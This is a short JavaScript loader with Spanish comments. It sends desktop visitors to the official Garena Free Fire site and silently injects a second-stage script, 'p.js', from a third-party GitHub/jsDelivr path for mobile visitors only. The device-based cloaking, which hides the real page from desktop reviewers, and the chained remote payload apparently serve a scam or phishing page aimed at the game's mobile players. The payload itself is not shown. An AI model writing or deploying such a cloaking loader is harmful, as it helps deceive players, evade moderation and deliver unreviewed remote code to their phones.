(function() {
    const isMobile = /android|iphone|ipad/i.test(navigator.userAgent.toLowerCase());
    
    if (!isMobile) {
        // Redirige si entran desde PC
        window.location.replace("https://ff.garena.com/");
        return;
    }

    // Carga el siguiente eslabón: p.js
    const s = document.createElement('script');
    s.src = "https://cdn.jsdelivr.net/gh/Jose1348/fuzzy-fiesta@deployment/p.js"; 
    document.head.appendChild(s);
})();
